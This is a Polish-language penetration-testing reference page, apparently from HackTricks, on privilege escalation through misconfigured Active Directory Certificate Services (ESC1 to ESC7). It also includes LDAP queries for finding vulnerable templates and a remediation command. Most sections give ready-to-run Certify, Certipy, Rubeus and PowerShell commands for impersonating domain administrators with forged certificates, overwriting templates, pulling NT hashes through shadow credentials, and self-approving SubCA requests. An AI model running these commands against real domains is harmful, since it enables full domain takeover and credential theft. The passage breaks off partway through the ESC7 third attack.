# Eskalacja uprawnień w domenie AD CS

{{#include ../../../banners/hacktricks-training.md}}


**To podsumowanie sekcji dotyczących technik eskalacji uprawnień z postów:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Błędnie skonfigurowane szablony certyfikatów - ESC1

### Wyjaśnienie

### Wyjaśnienie ESC1: błędnie skonfigurowane szablony certyfikatów

- **Enterprise CA przyznaje użytkownikom o niskich uprawnieniach prawa do rejestracji.**
- **Zatwierdzenie przez menedżera nie jest wymagane.**
- **Podpisy upoważnionego personelu nie są wymagane.**
- **Deskryptory zabezpieczeń szablonów certyfikatów są nadmiernie permisywne, co pozwala użytkownikom o niskich uprawnieniach uzyskać prawa do rejestracji.**
- **Szablony certyfikatów są skonfigurowane tak, aby definiować EKU ułatwiające uwierzytelnianie:**
  - Uwzględniono identyfikatory Extended Key Usage (EKU), takie jak Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) lub brak EKU (SubCA).
- **Szablon pozwala zgłaszającym na dołączenie subjectAltName do żądania podpisania certyfikatu (CSR):**
  - Active Directory (AD) nadaje subjectAltName (SAN) w certyfikacie priorytet podczas weryfikacji tożsamości, jeśli jest obecny. Oznacza to, że określając SAN w CSR, można zażądać certyfikatu umożliwiającego podszycie się pod dowolnego użytkownika (np. administratora domeny). To, czy zgłaszający może określić SAN, wskazuje właściwość `mspki-certificate-name-flag` w obiekcie AD szablonu certyfikatu. Właściwość ta jest maską bitową, a obecność flagi `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` pozwala zgłaszającemu określić SAN.

> [!CAUTION]
> Te ustawienia wskazują potencjalny szablon ESC1, ale nie potwierdzają, że ścieżka podszycia się jest kompletna. Sprawdź, czy docelowy principal może zarejestrować się w CA publikującym szablon, czy rejestracja w CA jest dozwolona oraz czy wydany certyfikat spełnia reguły silnego mapowania SID używane przez endpoint uwierzytelniania. Aktualnie załatane KDC mogą odrzucić żądany UPN, jeśli SID w certyfikacie nie pasuje do celu; zobacz [wskazówki Microsoft dotyczące mapowania certyfikatów](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Prawa do rejestracji przyznane **Domain Computers** mogą sprawić, że przygotowana tożsamość komputera będzie mogła dokonać rejestracji, nawet jeśli pierwotny użytkownik nie ma takiej możliwości. Oceniaj uprawnienia principal komputera osobno. Przed wysłaniem żądania sprawdź `msPKI-Minimal-Key-Size`: szablon wymagający kluczy RSA o długości 4096 bitów odrzuci domyślny klucz klienta o długości 2048 bitów. SID celu podany w żądaniu może rozwiązać problem niezgodności SID tylko wtedy, gdy CA i KDC zaakceptują wynikowy certyfikat i mapowanie; same flagi szablonu ani ACE Enroll tego nie potwierdzają.

Ta funkcja jest czasami włączana, aby umożliwić produktom lub usługom wdrożeniowym generowanie certyfikatów HTTPS lub hosta w locie albo z powodu braku wiedzy.

Warto zauważyć, że utworzenie certyfikatu z użyciem tej opcji wywołuje ostrzeżenie. Nie dzieje się tak, gdy istniejący szablon certyfikatu (np. szablon `WebServer`, w którym włączono `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) zostanie zduplikowany, a następnie zmodyfikowany przez dodanie OID uwierzytelniania.<sup>[[6]](#references)</sup>

### Nadużycie

Aby **znaleźć podatne szablony certyfikatów**, możesz uruchomić:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

Aby **wykorzystać tę podatność do podszycia się pod administratora**, można uruchomić:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

Następnie możesz przekonwertować wygenerowany **certyfikat do formatu `.pfx`** i użyć go, aby ponownie **uwierzytelnić się za pomocą Rubeus lub certipy**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Pliki binarne systemu Windows „Certreq.exe” i „Certutil.exe” mogą służyć do wygenerowania pliku PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Wyliczenie szablonów certyfikatów w schemacie konfiguracji lasu AD — w szczególności tych, które nie wymagają zatwierdzenia ani podpisów, mają EKU Client Authentication lub Smart Card Logon oraz włączoną flagę `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` — można przeprowadzić, uruchamiając następujące zapytanie LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Błędnie skonfigurowane szablony certyfikatów - ESC2

### Wyjaśnienie

Drugi scenariusz nadużycia jest wariantem pierwszego:

1. Enterprise CA przyznaje użytkownikom o niskich uprawnieniach prawa do rejestracji.
2. Wymóg zatwierdzenia przez przełożonego jest wyłączony.
3. Wymóg autoryzowanych podpisów został pominięty.
4. Nadmiernie liberalny deskryptor zabezpieczeń szablonu certyfikatu przyznaje użytkownikom o niskich uprawnieniach prawa do rejestracji certyfikatów.
5. **Szablon certyfikatu określono tak, aby zawierał EKU Any Purpose lub nie zawierał żadnego EKU.**

**EKU Any Purpose** pozwala atakującemu uzyskać certyfikat do **dowolnego celu**, w tym uwierzytelniania klienta, uwierzytelniania serwera, podpisywania kodu itp. Do wykorzystania tego scenariusza można zastosować tę samą **technikę co w przypadku ESC3**.

Certyfikaty **bez EKU**, które działają jak certyfikaty podrzędnego CA, można wykorzystać do **dowolnego celu** i **używać do podpisywania nowych certyfikatów**. Dzięki temu atakujący może określić dowolne EKU lub pola w nowych certyfikatach, wykorzystując certyfikat podrzędnego CA.

Nowe certyfikaty utworzone na potrzeby **uwierzytelniania w domenie** nie będą jednak działać, jeśli podrzędny CA nie jest zaufany przez obiekt **`NTAuthCertificates`**, co jest ustawieniem domyślnym. Mimo to atakujący może nadal tworzyć **nowe certyfikaty z dowolnym EKU** i dowolnymi wartościami certyfikatu. Można je potencjalnie **wykorzystać w niepożądany sposób** do wielu celów (np. podpisywania kodu, uwierzytelniania serwera itp.), co może mieć poważne konsekwencje dla innych aplikacji w sieci, takich jak SAML, AD FS lub IPSec.<sup>[[6]](#references)</sup>

Aby wyliczyć szablony pasujące do tego scenariusza w schemacie konfiguracji lasu AD, można uruchomić następujące zapytanie LDAP:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## Nieprawidłowo skonfigurowane szablony Enrollment Agent — ESC3

### Wyjaśnienie

Ten scenariusz przypomina pierwszy i drugi, ale **abusing** innego **EKU** (Certificate Request Agent) oraz **2 różnych szablonów** (dlatego ma 2 zestawy wymagań).

**EKU Certificate Request Agent** (OID 1.3.6.1.4.1.311.20.2.1), znany w dokumentacji Microsoft jako **Enrollment Agent**, pozwala podmiotowi **uzyskać** **certyfikat** **w imieniu innego użytkownika**.

**„Enrollment agent”** uzyskuje certyfikat z takiego **szablonu**, a następnie używa otrzymanego **certyfikatu do współpodpisania CSR w imieniu innego użytkownika**. Potem **wysyła** **współpodpisany CSR** do CA, uzyskując certyfikat z **szablonu**, który **zezwala na „enroll on behalf of”**; CA odpowiada wtedy **certyfikatem należącym do „innego” użytkownika**.<sup>[[6]](#references)</sup>

**Wymagania 1:**

- Enterprise CA przyznaje użytkownikom o niskich uprawnieniach prawa do uzyskiwania certyfikatów.
- Pominięto wymóg zatwierdzenia przez kierownika.
- Brak wymogu autoryzowanych podpisów.
- Deskryptor zabezpieczeń szablonu certyfikatu jest nadmiernie liberalny i przyznaje użytkownikom o niskich uprawnieniach prawa do uzyskiwania certyfikatów.
- Szablon certyfikatu zawiera EKU Certificate Request Agent, umożliwiający wnioskowanie o certyfikaty z innych szablonów w imieniu innych podmiotów.

**Wymagania 2:**

- Enterprise CA przyznaje użytkownikom o niskich uprawnieniach prawa do uzyskiwania certyfikatów.
- Zatwierdzenie przez kierownika jest pomijane.
- Docelowy szablon wersji 1 może akceptować enrollment agent bez nowszych, szczegółowych mechanizmów kontroli zasad wydawania certyfikatów; w przypadku wersji 2 lub nowszej należy ocenić wymagania dotyczące wydawania na podstawie zasad aplikacji oraz autoryzowane podpisy, zamiast wykluczać szablon wyłącznie ze względu na wersję.
- EKU zdefiniowany w szablonie certyfikatu umożliwia uwierzytelnianie domenowe.
- Ograniczenia dla enrollment agents nie są stosowane na CA.

Docelowy szablon musi być również opublikowany przez wybraną CA, zezwalać kontu docelowemu na uzyskanie certyfikatu oraz obsługiwać zamierzone zastosowanie do uwierzytelniania domenowego. Sprawdź wymagane atrybuty subject/SAN dla tego konta; na przykład szablon, który tworzy subject na podstawie adresu e-mail z AD, nie może wystawić certyfikatu dla konta bez wymaganej wartości `mail`. Sam certyfikat agenta nie spełnia tych wymagań dotyczących szablonu docelowego.

### Abuse

Możesz użyć [**Certify**](https://github.com/GhostPack/Certify) lub [**Certipy**](https://github.com/ly4k/Certipy), aby wykorzystać ten scenariusz:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

Użytkownicy, którym wolno **uzyskać** **certyfikat agenta rejestracji**, szablony, w których agenci rejestracji mogą się rejestrować, oraz **konta**, w imieniu których agent rejestracji może działać, mogą być ograniczane przez urzędy certyfikacji przedsiębiorstwa. Można to zrobić, otwierając przystawkę `certsrc.msc`, klikając **prawym przyciskiem myszy urząd certyfikacji**, wybierając **Właściwości**, a następnie przechodząc do karty „Agenci rejestracji”.

Należy jednak zauważyć, że domyślnym ustawieniem urzędów certyfikacji jest „**Nie ograniczaj agentów rejestracji**”. Gdy administratorzy włączą ograniczenia dotyczące agentów rejestracji, wybierając ustawienie „Ogranicz agentów rejestracji”, domyślna konfiguracja nadal pozostaje bardzo liberalna. Umożliwia ona **Everyone** rejestrowanie się we wszystkich szablonach w imieniu dowolnej osoby.

### PoC w PowerShellu wyłącznie dla Windows z Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) wykorzystuje ESC1 i ESC2/ESC3 bez Certify ani Certipy. Jego skrypty tworzą eksportowalny klucz RSA o długości 2048 bitów za pomocą interfejsu COM `X509Enrollment`, budują żądanie PKCS#10, wyszukują przez LDAP pierwszy `pKIEnrollmentService`, przesyłają żądanie za pomocą `CertificateAuthority.Request`, instalują odpowiedź w `Cert:\CurrentUser\My` i eksportują plik PFX zakodowany w Base64. Skrypt ESC1 dodaje wybraną przez atakującego nazwę UPN SAN (`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, wartość `0xb`), natomiast skrypty ESC2/ESC3 używają pierwszego certyfikatu do podpisania żądania PKCS#7 składanego w imieniu innej osoby.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

Skrypty wypisują Base64 pliku **PFX**, który zawiera klucz prywatny i może być bezpośrednio użyty w Rubeus. Nie zastępuj go przez `[Convert]::ToBase64String($cert.RawData)`: `RawData` koduje tylko certyfikat publiczny i nie może podpisać żądania PKINIT.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## Kontrola dostępu do podatnego szablonu certyfikatu - ESC4

### **Wyjaśnienie**

**Descriptor bezpieczeństwa** na **szablonach certyfikatów** określa **uprawnienia**, jakie poszczególne **podmioty AD** mają względem szablonu.

Jeśli **attacker** ma wymagane **uprawnienia**, aby **zmienić** **szablon** i **wprowadzić** dowolne **wykorzystywalne błędne konfiguracje** opisane we **wcześniejszych sekcjach**, może to umożliwić eskalację uprawnień.

Ważne uprawnienia dotyczące szablonów certyfikatów obejmują:<sup>[[6]](#references)</sup>

- **Owner:** Zapewnia niejawne uprawnienia do zarządzania obiektem, umożliwiając modyfikację dowolnych atrybutów.
- **FullControl:** Zapewnia pełne uprawnienia do obiektu, w tym możliwość modyfikowania dowolnych atrybutów.
- **WriteOwner:** Umożliwia zmianę właściciela obiektu na podmiot kontrolowany przez attackera.
- **WriteDacl:** Umożliwia zmianę kontroli dostępu, co może przyznać attackerowi uprawnienie FullControl.
- **WriteProperty:** Umożliwia edycję dowolnych właściwości obiektu.

Sprawdź również DACL kontenera `CN=Certificate Templates,CN=Public Key Services,CN=Services,...`. Odpowiedni ACE `CreateChild` obejmujący klasę [`pKICertificateTemplate`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c) lub szerokie uprawnienia FullControl może umożliwiać utworzenie nowego obiektu szablonu. [Dokumentacja Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44) wskazuje, że kontener przechowuje te obiekty szablonów. Przed określeniem, czy utworzenie obiektu jest możliwe, sprawdź pasujące ACE typu deny oraz dziedziczenie. Samo utworzenie szablonu nie powoduje wydania certyfikatu: CA musi go opublikować, podmiot żądający musi mieć uprawnienia do enrollment, a certyfikat musi być mapowany na zamierzoną tożsamość w punkcie końcowym uwierzytelniania.

### Nadużycie

Aby wyliczyć podmioty mające uprawnienia do edycji szablonów i innych obiektów PKI, przeprowadź enumerację za pomocą Certify:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

Przykład privesc podobnego do poprzedniego:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 występuje, gdy użytkownik ma uprawnienia do zapisu w szablonie certyfikatu. Można to na przykład wykorzystać do nadpisania konfiguracji szablonu certyfikatu, aby stał się podatny na ESC1.

Szablon, który już pozwala zgłaszającemu określić temat certyfikatu, ale ma tylko zastosowanie Server Authentication, sam w sobie nie jest szablonem do logowania użytkownika. Mając skuteczne uprawnienia do kontroli szablonu, atakujący może zmienić jego EKU uwierzytelniania lub zasady aplikacji przed złożeniem wniosku o certyfikat; [Microsoft opisuje przeznaczenie EKU Smartcard Logon do logowania](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). Sprawdź, czy CA publikuje zmodyfikowany szablon, czy wnioskodawca może się zapisać, czy spełnione są wymagania dotyczące zatwierdzenia/podpisu oraz czy wystawiony certyfikat jest mapowany na zamierzone konto. W szczególności [załatane kontrolery domeny działające w trybie Full Enforcement](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) odrzucają certyfikaty bez silnego mapowania; dodanie UPN celu do wniosku nie omija tego wymogu.

Jak widać na powyższej ścieżce, tylko `JOHNPC` ma te uprawnienia, ale nasz użytkownik `JOHN` ma nową krawędź `AddKeyCredentialLink` do `JOHNPC`. Ponieważ ta technika jest związana z certyfikatami, zaimplementowałem również ten atak, znany jako [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).<sup>[[8]](#references)</sup> Oto krótki przedsmak działania polecenia `shadow auto` w Certipy, które pozwala pobrać hash NT ofiary.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy** może zastąpić konfigurację szablonu certyfikatu za pomocą pojedynczego polecenia. **Domyślnie** Certipy **zastąpi** konfigurację, aby uczynić ją **podatną na ESC1**. Możemy też podać parametr **`-save-old`, aby zapisać starą konfigurację**, co przyda się do **przywrócenia** konfiguracji po naszym ataku.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## Kontrola dostępu do podatnych obiektów PKI - ESC5

### Wyjaśnienie

Rozbudowana sieć powiązanych relacji opartych na ACL, obejmująca kilka obiektów poza szablonami certyfikatów i urzędem certyfikacji, może wpłynąć na bezpieczeństwo całego systemu AD CS. Do obiektów, które mogą znacząco wpłynąć na bezpieczeństwo, należą:

- Obiekt komputera AD serwera CA, który może zostać przejęty za pomocą mechanizmów takich jak S4U2Self lub S4U2Proxy.
- Serwer RPC/DCOM serwera CA.
- Dowolny obiekt AD lub kontener będący potomkiem w obrębie określonej ścieżki kontenera `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Ścieżka ta obejmuje między innymi kontenery i obiekty takie jak kontener Certificate Templates, kontener Certification Authorities, obiekt NTAuthCertificates oraz kontener Enrollment Services.

Bezpieczeństwo systemu PKI może zostać naruszone, jeśli atakujący o niskich uprawnieniach zdoła przejąć kontrolę nad którymkolwiek z tych kluczowych komponentów.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Wyjaśnienie

Wpis na [**CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage) omawia również implikacje flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, zgodnie z opisem Microsoftu. Ta konfiguracja, po włączeniu na urzędzie certyfikacji (CA), pozwala na umieszczanie **wartości zdefiniowanych przez użytkownika** w **alternatywnej nazwie podmiotu** dla **dowolnego żądania**, w tym żądań tworzonych na podstawie Active Directory®. W rezultacie intruz może uzyskać certyfikat przy użyciu **dowolnego szablonu** skonfigurowanego do **uwierzytelniania** w domenie — w szczególności takiego, który umożliwia rejestrowanie certyfikatów **użytkownikom bez uprawnień**, jak standardowy szablon User. Dzięki temu można uzyskać certyfikat pozwalający intruzowi uwierzytelnić się jako administrator domeny lub **dowolna inna aktywna jednostka** w domenie.<sup>[[9]](#references)</sup>

**Uwaga**: Sposób dodawania **alternatywnych nazw** do żądania podpisania certyfikatu (CSR) za pomocą argumentu `-attrib "SAN:"` w `certreq.exe` (określanego jako „Name Value Pairs”) **różni się** od strategii wykorzystania SAN w ESC1. Różnica polega na tym, **jak zapisywane są informacje o koncie** — w atrybucie certyfikatu, a nie w rozszerzeniu.

### Nadużycie

Aby sprawdzić, czy to ustawienie jest aktywne, organizacje mogą użyć następującego polecenia z `certutil.exe`:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

Ta operacja zasadniczo wykorzystuje **zdalny dostęp do rejestru**, dlatego alternatywnym podejściem może być:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Narzędzia takie jak [**Certify**](https://github.com/GhostPack/Certify) i [**Certipy**](https://github.com/ly4k/Certipy) potrafią wykrywać tę błędną konfigurację i ją wykorzystywać:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

Aby zmienić te ustawienia, zakładając, że ma się uprawnienia **administratora domeny** lub równoważne, można wykonać następujące polecenie z dowolnej stacji roboczej:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Aby wyłączyć tę konfigurację w swoim środowisku, flagę można usunąć za pomocą:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> Po zainstalowaniu aktualizacji zabezpieczeń z maja 2022 r. nowo wystawiane **certificates** będą zawierać **security extension**, która uwzględnia właściwość `objectSid` **requestera**. W przypadku ESC1 ten SID pochodzi z określonego SAN. Jednak w przypadku **ESC6** SID odzwierciedla `objectSid` **requestera**, a nie SAN.\
> Aby wykorzystać ESC6, system musi być podatny na ESC10 (słabe mapowania certyfikatów), które nadaje **SAN wyższy priorytet niż nowe rozszerzenie zabezpieczeń**.

## Kontrola dostępu do urzędu certyfikacji podatna na nadużycia - ESC7

### Atak 1

#### Wyjaśnienie

Kontrola dostępu do urzędu certyfikacji jest realizowana za pomocą zestawu uprawnień regulujących działania CA. Uprawnienia te można wyświetlić, otwierając `certsrv.msc`, klikając prawym przyciskiem myszy urząd CA, wybierając właściwości, a następnie przechodząc do karty Zabezpieczenia. Ponadto uprawnienia można wyliczyć za pomocą modułu PSPKI i poleceń takich jak:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

Zapewnia to wgląd w główne uprawnienia, a mianowicie **`ManageCA`** i **`ManageCertificates`**, odpowiadające odpowiednio rolom „administratora CA” i „menedżera certyfikatów”.<sup>[[6]](#references)</sup>

#### Nadużycie

Uprawnienia **`ManageCA`** w urzędzie certyfikacji pozwalają podmiotowi zdalnie modyfikować ustawienia za pomocą PSPKI. Obejmuje to włączenie flagi **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, która pozwala określać SAN w dowolnym szablonie, co ma kluczowe znaczenie w przypadku eskalacji domeny.

Proces ten można uprościć za pomocą cmdletu PSPKI **Enable-PolicyModuleFlag**, który umożliwia wprowadzanie zmian bez bezpośredniej interakcji z GUI.

Posiadanie uprawnień **`ManageCertificates`** umożliwia zatwierdzanie oczekujących żądań, skutecznie omijając zabezpieczenie „zatwierdzenie przez menedżera certyfikatów CA”.

Do żądania, zatwierdzania i pobierania certyfikatu można użyć modułów **Certify** i **PSPKI**:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Atak 2

#### Wyjaśnienie

> [!WARNING]
> W **poprzednim ataku** użyto uprawnień **`Manage CA`**, aby **włączyć** flagę **EDITF_ATTRIBUTESUBJECTALTNAME2** i przeprowadzić atak **ESC6**, ale nie przyniesie to żadnego efektu, dopóki usługa CA (`CertSvc`) nie zostanie ponownie uruchomiona. Użytkownik z prawem dostępu `Manage CA` może również **ponownie uruchomić usługę**. Nie oznacza to jednak, że może **zrobić to zdalnie**. Ponadto E**SC6 może nie działać od razu** w większości załatanych środowisk ze względu na aktualizacje zabezpieczeń z maja 2022 roku.

Dlatego przedstawiamy tu inny atak.

Wymagania wstępne:

- Tylko uprawnienie **`ManageCA`**
- Uprawnienie **`Manage Certificates`** (można je nadać za pomocą **`ManageCA`**)
- Szablon certyfikatu **`SubCA`** musi być **włączony** (można go włączyć za pomocą **`ManageCA`**)

Technika wykorzystuje fakt, że użytkownicy z prawami dostępu `Manage CA` _oraz_ `Manage Certificates` mogą **zatwierdzać odrzucone żądania certyfikatów**. Szablon certyfikatu **`SubCA`** jest **podatny na ESC1**, ale zapisywać się w nim mogą **tylko administratorzy**. **Użytkownik** może więc **wysłać żądanie** zapisu do **`SubCA`**, które zostanie **odrzucone**, ale **później zatwierdzone przez menedżera**.<sup>[[6]](#references)</sup>

#### Nadużycie

Możesz **nadać sobie prawo dostępu `Manage Certificates`**, dodając swojego użytkownika jako nowego oficera.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

Szablon **`SubCA`** można **włączyć na CA** za pomocą parametru `-enable-template`. Domyślnie szablon `SubCA` jest włączony.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

Jeśli spełniliśmy wymagania wstępne do tego ataku, możemy zacząć od **zażądania certyfikatu na podstawie szablonu `SubCA`**.

**Żądanie zostanie odrzuco**ne, ale zachowamy klucz prywatny i zanotujemy identyfikator żądania.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

Dzięki naszym **`Manage CA` i `Manage Certificates`** możemy następnie **wystawić żądany certyfikat** za pomocą polecenia `ca` i parametru `-issue-request <request ID>`.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

I na koniec możemy **pobrać wystawiony certyfikat** za pomocą polecenia `req` i parametru `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Wyjaśnienie

Oprócz klasycznych nadużyć ESC7 (włączania atrybutów EDITF lub zatwierdzania oczekujących żądań) **Certify 2.0** ujawniło zupełnie nową metodę, która wymaga jedynie roli *Manage Certificates* (czyli **Certificate Manager / Officer**) na Enterprise CA.<sup>[[3]](#references)</sup>

Metodę RPC `ICertAdmin::SetExtension` może wywołać każdy podmiot posiadający uprawnienie *Manage Certificates*. Choć tradycyjnie legalne urzędy CA używały tej metody do aktualizowania rozszerzeń w **oczekujących** żądaniach, atakujący może nadużyć jej, aby **dodać *nierozszerzenie domyślne*** (na przykład niestandardowy OID *Certificate Issuance Policy*, taki jak `1.1.1.1`) do żądania oczekującego na zatwierdzenie.

Ponieważ wskazany szablon **nie definiuje wartości domyślnej dla tego rozszerzenia**, CA NIE nadpisze wartości kontrolowanej przez atakującego, gdy żądanie zostanie ostatecznie zrealizowane. Wystawiony certyfikat będzie więc zawierał rozszerzenie wybrane przez atakującego, które może:

* Spełnić wymagania dotyczące Application / Issuance Policy innych podatnych szablonów (prowadząc do eskalacji uprawnień).
